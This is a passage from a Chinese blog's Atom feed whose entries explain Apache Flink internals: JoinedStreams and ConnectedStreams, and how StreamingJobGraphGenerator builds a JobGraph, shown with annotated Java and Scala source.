firstInput.join(secondInput)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    .where(&lt;span class=&quot;string&quot;&gt;&quot;userId&quot;&lt;/span&gt;).equalTo(&lt;span class=&quot;string&quot;&gt;&quot;id&quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    .window(&lt;span class=&quot;type&quot;&gt;TumblingEventTimeWindows&lt;/span&gt;.of(&lt;span class=&quot;type&quot;&gt;Time&lt;/span&gt;.seconds(&lt;span class=&quot;number&quot;&gt;3&lt;/span&gt;)))&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    .apply (&lt;span class=&quot;keyword&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;type&quot;&gt;JoinFunction&lt;/span&gt; () &amp;#123;...&amp;#125;)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;上述 JoinedStreams 的样例代码在运行时会转换成如下的执行图：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://img3.tbcdn.cn/5476e8b07b923/TB1mW_zJVXXXXcfXVXXXXXXXXXX&quot; width=&quot;500px&quot;&gt;&lt;/p&gt;
&lt;p&gt;双流上的数据在同一个key的会被分别分配到同一个window窗口的左右两个篮子里，当window结束的时候，会对左右篮子进行笛卡尔积从而得到每一对pair，对每一对pair应用 JoinFunction。不过目前（Flink 1.1.x）JoinedStreams 只是简单地实现了流上的join操作而已，距离真正的生产使用还是有些距离。因为目前 join 窗口的双流数据都是被缓存在内存中的，也就是说如果某个key上的窗口数据太多就会导致 JVM OOM（然而数据倾斜是常态）。双流join的难点也正是在这里，这也是社区后面对 join 操作的优化方向，例如可以借鉴Flink在批处理join中的优化方案，也可以用ManagedMemory来管理窗口中的数据，并当数据超过阈值时能spill到硬盘。&lt;/p&gt;
&lt;h2 id=&quot;ConnectedStreams&quot;&gt;&lt;a href=&quot;#ConnectedStreams&quot; class=&quot;headerlink&quot; title=&quot;ConnectedStreams&quot;&gt;&lt;/a&gt;ConnectedStreams&lt;/h2&gt;&lt;p&gt;在 DataStream 上有一个 union 的转换 &lt;code&gt;dataStream.union(otherStream1, otherStream2, ...)&lt;/code&gt;，用来合并多个流，新的流会包含所有流中的数据。union 有一个限制，就是所有合并的流的类型必须是一致的。&lt;code&gt;ConnectedStreams&lt;/code&gt; 提供了和 union 类似的功能，用来连接&lt;strong&gt;两个&lt;/strong&gt;流，但是与 union 转换有以下几个区别：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;ConnectedStreams 只能连接两个流，而 union 可以连接多于两个流。&lt;/li&gt;
&lt;li&gt;ConnectedStreams 连接的两个流类型可以不一致，而 union 连接的流的类型必须一致。&lt;/li&gt;
&lt;li&gt;ConnectedStreams 会对两个流的数据应用不同的处理方法，并且双流之间可以共享状态。这在第一个流的输入会影响第二个流时, 会非常有用。&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;如下 ConnectedStreams 的样例，连接 &lt;code&gt;input&lt;/code&gt; 和 &lt;code&gt;other&lt;/code&gt; 流，并在&lt;code&gt;input&lt;/code&gt;流上应用&lt;code&gt;map1&lt;/code&gt;方法，在&lt;code&gt;other&lt;/code&gt;上应用&lt;code&gt;map2&lt;/code&gt;方法，双流可以共享状态（比如计数）。&lt;/p&gt;
&lt;figure class=&quot;highlight scala&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;val&lt;/span&gt; input: &lt;span class=&quot;type&quot;&gt;DataStream&lt;/span&gt;[&lt;span class=&quot;type&quot;&gt;MyType&lt;/span&gt;] = ...&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;val&lt;/span&gt; other: &lt;span class=&quot;type&quot;&gt;DataStream&lt;/span&gt;[&lt;span class=&quot;type&quot;&gt;AnotherType&lt;/span&gt;] = ...&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;val&lt;/span&gt; connected: &lt;span class=&quot;type&quot;&gt;ConnectedStreams&lt;/span&gt;[&lt;span class=&quot;type&quot;&gt;MyType&lt;/span&gt;, &lt;span class=&quot;type&quot;&gt;AnotherType&lt;/span&gt;] = input.connect(other)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;val&lt;/span&gt; result: &lt;span class=&quot;type&quot;&gt;DataStream&lt;/span&gt;[&lt;span class=&quot;type&quot;&gt;ResultType&lt;/span&gt;] = &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        connected.map(&lt;span class=&quot;keyword&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;type&quot;&gt;CoMapFunction&lt;/span&gt;[&lt;span class=&quot;type&quot;&gt;MyType&lt;/span&gt;, &lt;span class=&quot;type&quot;&gt;AnotherType&lt;/span&gt;, &lt;span class=&quot;type&quot;&gt;ResultType&lt;/span&gt;]() &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &lt;span class=&quot;keyword&quot;&gt;override&lt;/span&gt; &lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;map1&lt;/span&gt;&lt;/span&gt;(value: &lt;span class=&quot;type&quot;&gt;MyType&lt;/span&gt;): &lt;span class=&quot;type&quot;&gt;ResultType&lt;/span&gt; = &amp;#123; ... &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &lt;span class=&quot;keyword&quot;&gt;override&lt;/span&gt; &lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;map2&lt;/span&gt;&lt;/span&gt;(value: &lt;span class=&quot;type&quot;&gt;AnotherType&lt;/span&gt;): &lt;span class=&quot;type&quot;&gt;ResultType&lt;/span&gt; = &amp;#123; ... &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &amp;#125;)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;当并行度为2时，其执行图如下所示：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://img3.tbcdn.cn/5476e8b07b923/TB1WEjuJVXXXXcHXFXXXXXXXXXX&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;h2 id=&quot;总结&quot;&gt;&lt;a href=&quot;#总结&quot; class=&quot;headerlink&quot; title=&quot;总结&quot;&gt;&lt;/a&gt;总结&lt;/h2&gt;&lt;p&gt;本文介绍通过不同数据流类型的转换图来解释每一种数据流的含义、转换关系。后面的文章会深入讲解 Window 机制的实现，双流 Join 的实现等。 &lt;/p&gt;
</content>
    
    <summary type="html">
    
      &lt;p&gt;Flink 为流处理和批处理分别提供了 DataStream API 和 DataSet API。正是这种高层的抽象和 flunent API 极大地便利了用户编写大数据应用。不过很多初学者在看到&lt;a href=&quot;&quot;&gt;官方 Streaming 文档&lt;/a&gt;中那一大坨的转换时，常常会蒙了圈，文档中那些只言片语也很难讲清它们之间的关系。所以本文将介绍几种关键的数据流类型，它们之间是如何通过转换关联起来的。下图展示了 Flink 中目前支持的主要几种流的类型，以及它们之间的转换关系。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://img3.tbcdn.cn/5476e8b07b923/TB1BWrvJVXXXXXbXVXXXXXXXXXX&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="Flink" scheme="http://wuchong.me/categories/Flink/"/>
    
    
      <category term="Flink原理与实现" scheme="http://wuchong.me/tags/Flink%E5%8E%9F%E7%90%86%E4%B8%8E%E5%AE%9E%E7%8E%B0/"/>
    
      <category term="Flink" scheme="http://wuchong.me/tags/Flink/"/>
    
  </entry>
  
  <entry>
    <title>Flink 原理与实现：如何生成 JobGraph</title>
    <link href="http://wuchong.me/blog/2016/05/10/flink-internals-how-to-build-jobgraph/"/>
    <id>http://wuchong.me/blog/2016/05/10/flink-internals-how-to-build-jobgraph/</id>
    <published>2016-05-10T05:25:53.000Z</published>
    <updated>2016-06-12T03:22:50.000Z</updated>
    
    <content type="html">&lt;p&gt;继前文&lt;a href=&quot;http://wuchong.me/blog/2016/05/03/flink-internals-overview/&quot;&gt;Flink 原理与实现：架构和拓扑概览&lt;/a&gt;中介绍了Flink的四层执行图模型，本文将主要介绍 Flink 是如何将 StreamGraph 转换成 JobGraph 的。根据用户用Stream API编写的程序，构造出一个代表拓扑结构的StreamGraph的。以 WordCount 为例，转换图如下图所示：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://img3.tbcdn.cn/5476e8b07b923/TB1DzYXJFXXXXXJXVXXXXXXXXXX&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;StreamGraph 和 JobGraph 都是在 Client 端生成的，也就是说我们可以在 IDE 中通过断点调试观察 StreamGraph 和 JobGraph 的生成过程。&lt;/p&gt;
&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;
&lt;p&gt;JobGraph 的相关数据结构主要在 &lt;code&gt;org.apache.flink.runtime.jobgraph&lt;/code&gt; 包中。构造 JobGraph 的代码主要集中在 &lt;code&gt;StreamingJobGraphGenerator&lt;/code&gt; 类中，入口函数是 &lt;code&gt;StreamingJobGraphGenerator.createJobGraph()&lt;/code&gt;。我们首先来看下&lt;code&gt;StreamingJobGraphGenerator&lt;/code&gt;的核心源码：&lt;/p&gt;
&lt;figure class=&quot;highlight java&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;class&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;StreamingJobGraphGenerator&lt;/span&gt; &lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &lt;span class=&quot;keyword&quot;&gt;private&lt;/span&gt; StreamGraph streamGraph;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &lt;span class=&quot;keyword&quot;&gt;private&lt;/span&gt; JobGraph jobGraph;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &lt;span class=&quot;comment&quot;&gt;// id -&amp;gt; JobVertex&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &lt;span class=&quot;keyword&quot;&gt;private&lt;/span&gt; Map&amp;lt;Integer, JobVertex&amp;gt; jobVertices;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &lt;span class=&quot;comment&quot;&gt;// 已经构建的JobVertex的id集合&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &lt;span class=&quot;keyword&quot;&gt;private&lt;/span&gt; Collection&amp;lt;Integer&amp;gt; builtVertices;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &lt;span class=&quot;comment&quot;&gt;// 物理边集合（排除了chain内部的边）, 按创建顺序排序&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &lt;span class=&quot;keyword&quot;&gt;private&lt;/span&gt; List&amp;lt;StreamEdge&amp;gt; physicalEdgesInOrder;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &lt;span class=&quot;comment&quot;&gt;// 保存chain信息，部署时用来构建 OperatorChain，startNodeId -&amp;gt; (currentNodeId -&amp;gt; StreamConfig)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &lt;span class=&quot;keyword&quot;&gt;private&lt;/span&gt; Map&amp;lt;Integer, Map&amp;lt;Integer, StreamConfig&amp;gt;&amp;gt; chainedConfigs;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &lt;span class=&quot;comment&quot;&gt;// 所有节点的配置信息，id -&amp;gt; StreamConfig&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &lt;span class=&quot;keyword&quot;&gt;private&lt;/span&gt; Map&amp;lt;Integer, StreamConfig&amp;gt; vertexConfigs;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &lt;span class=&quot;comment&quot;&gt;// 保存每个节点的名字，id -&amp;gt; chainedName&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &lt;span class=&quot;keyword&quot;&gt;private&lt;/span&gt; Map&amp;lt;Integer, String&amp;gt; chainedNames;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &lt;span class=&quot;comment&quot;&gt;// 构造函数，入参只有 StreamGraph&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;StreamingJobGraphGenerator&lt;/span&gt;&lt;span class=&quot;params&quot;&gt;(StreamGraph streamGraph)&lt;/span&gt; &lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;this&lt;/span&gt;.streamGraph = streamGraph;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &lt;span class=&quot;comment&quot;&gt;// 根据 StreamGraph，生成 JobGraph&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;public&lt;/span&gt; JobGraph &lt;span class=&quot;title&quot;&gt;createJobGraph&lt;/span&gt;&lt;span class=&quot;params&quot;&gt;()&lt;/span&gt; &lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    jobGraph = &lt;span class=&quot;keyword&quot;&gt;new&lt;/span&gt; JobGraph(streamGraph.getJobName());&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;comment&quot;&gt;// streaming 模式下，调度模式是所有节点（vertices）一起启动&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    jobGraph.setScheduleMode(ScheduleMode.ALL);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;comment&quot;&gt;// 初始化成员变量&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    init();&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;comment&quot;&gt;// 广度优先遍历 StreamGraph 并且为每个SteamNode生成hash id，&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;comment&quot;&gt;// 保证如果提交的拓扑没有改变，则每次生成的hash都是一样的&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    Map&amp;lt;Integer, &lt;span class=&quot;keyword&quot;&gt;byte&lt;/span&gt;[]&amp;gt; hashes = traverseStreamGraphAndGenerateHashes();&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;comment&quot;&gt;// 最重要的函数，生成JobVertex，JobEdge等，并尽可能地将多个节点chain在一起&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    setChaining(hashes);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;comment&quot;&gt;// 将每个JobVertex的入边集合也序列化到该JobVertex的StreamConfig中&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;comment&quot;&gt;// (出边集合已经在setChaining的时候写入了)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    setPhysicalEdges();&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;comment&quot;&gt;// 根据group name，为每个 JobVertex 指定所属的 SlotSharingGroup &lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;comment&quot;&gt;// 以及针对 Iteration的头尾设置  CoLocationGroup&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    setSlotSharing();&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;comment&quot;&gt;// 配置checkpoint&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    configureCheckpointing();&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;comment&quot;&gt;// 配置重启策略（不重启，还是固定延迟重启）&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    configureRestartStrategy();&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;try&lt;/span&gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;      &lt;span class=&quot;comment&quot;&gt;// 将 StreamGraph 的 ExecutionConfig 序列化到 JobGraph 的配置中&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;      InstantiationUtil.writeObjectToConfig(&lt;span class=&quot;keyword&quot;&gt;this&lt;/span&gt;.streamGraph.getExecutionConfig(), &lt;span class=&quot;keyword&quot;&gt;this&lt;/span&gt;.jobGraph.getJobConfiguration(), ExecutionConfig.CONFIG_KEY);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#125; &lt;span class=&quot;keyword&quot;&gt;catch&lt;/span&gt; (IOException e) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;      &lt;span class=&quot;keyword&quot;&gt;throw&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;new&lt;/span&gt; RuntimeException(&lt;span class=&quot;string&quot;&gt;&quot;Config object could not be written to Job Configuration: &quot;&lt;/span&gt;, e);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; jobGraph;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  ...&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;code&gt;StreamingJobGraphGenerator&lt;/code&gt;的成员变量都是为了辅助生成最终的JobGraph。&lt;code&gt;createJobGraph()&lt;/code&gt;函数的逻辑也很清晰，首先为所有节点生成一个唯一的hash id，如果节点在多次提交中没有改变（包括并发度、上下游等），那么这个id就不会改变，这主要用于故障恢复。这里我们不能用 &lt;code&gt;StreamNode.id&lt;/code&gt;来代替，因为这是一个从1开始的静态计数变量，同样的Job可能会得到不一样的id，如下代码示例的两个job是完全一样的，但是source的id却不一样了。然后就是最关键的chaining处理，和生成JobVetex、JobEdge等。之后就是写入各种配置相关的信息。&lt;/p&gt;
&lt;figure class=&quot;highlight java&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;// 范例1：A.id=1  B.id=2&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;DataStream&amp;lt;String&amp;gt; A = ...&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;DataStream&amp;lt;String&amp;gt; B = ...&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;A.union(B).print();&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;// 范例2：A.id=2  B.id=1&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;DataStream&amp;lt;String&amp;gt; B = ...&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;DataStream&amp;lt;String&amp;gt; A = ...&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;A.union(B).print();&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;下面具体分析下关键函数 &lt;code&gt;setChaining&lt;/code&gt; 的实现：&lt;/p&gt;
&lt;figure class=&quot;highlight java&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;// 从source开始建立 node chains&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;private&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;setChaining&lt;/span&gt;&lt;span class=&quot;params&quot;&gt;(Map&amp;lt;Integer, &lt;span class=&quot;keyword&quot;&gt;byte&lt;/span&gt;[]&amp;gt; hashes)&lt;/span&gt; &lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &lt;span class=&quot;keyword&quot;&gt;for&lt;/span&gt; (Integer sourceNodeId : streamGraph.getSourceIDs()) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    createChain(sourceNodeId, sourceNodeId, hashes);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;// 构建node chains，返回当前节点的物理出边&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;// startNodeId != currentNodeId 时,说明currentNode是chain中的子节点&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;private&lt;/span&gt; List&amp;lt;StreamEdge&amp;gt; &lt;span class=&quot;title&quot;&gt;createChain&lt;/span&gt;&lt;span class=&quot;params&quot;&gt;(&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    Integer startNodeId,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    Integer currentNodeId,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    Map&amp;lt;Integer, &lt;span class=&quot;keyword&quot;&gt;byte&lt;/span&gt;[]&amp;gt; hashes)&lt;/span&gt; &lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; (!builtVertices.contains(startNodeId)) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;comment&quot;&gt;// 过渡用的出边集合, 用来生成最终的 JobEdge, 注意不包括 chain 内部的边&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    List&amp;lt;StreamEdge&amp;gt; transitiveOutEdges = &lt;span class=&quot;keyword&quot;&gt;new&lt;/span&gt; ArrayList&amp;lt;StreamEdge&amp;gt;();&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    List&amp;lt;StreamEdge&amp;gt; chainableOutputs = &lt;span class=&quot;keyword&quot;&gt;new&lt;/span&gt; ArrayList&amp;lt;StreamEdge&amp;gt;();&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    List&amp;lt;StreamEdge&amp;gt; nonChainableOutputs = &lt;span class=&quot;keyword&quot;&gt;new&lt;/span&gt; ArrayList&amp;lt;StreamEdge&amp;gt;();&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;comment&quot;&gt;// 将当前节点的出边分成 chainable 和 nonChainable 两类&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;for&lt;/span&gt; (StreamEdge outEdge : streamGraph.getStreamNode(currentNodeId).getOutEdges()) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;      &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; (isChainable(outEdge)) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        chainableOutputs.add(outEdge);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;      &amp;#125; &lt;span class=&quot;keyword&quot;&gt;else&lt;/span&gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        nonChainableOutputs.add(outEdge);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;      &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;comment&quot;&gt;//==&amp;gt; 递归调用&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;for&lt;/span&gt; (StreamEdge chainable : chainableOutputs) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;      transitiveOutEdges.addAll(createChain(startNodeId, chainable.getTargetId(), hashes));&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;for&lt;/span&gt; (StreamEdge nonChainable : nonChainableOutputs) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;      transitiveOutEdges.add(nonChainable);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;      createChain(nonChainable.getTargetId(), nonChainable.getTargetId(), hashes);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;comment&quot;&gt;// 生成当前节点的显示名，如：&quot;Keyed Aggregation -&amp;gt; Sink: Unnamed&quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    chainedNames.put(currentNodeId, createChainedName(currentNodeId, chainableOutputs));&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;comment&quot;&gt;// 如果当前节点是起始节点, 则直接创建 JobVertex 并返回 StreamConfig, 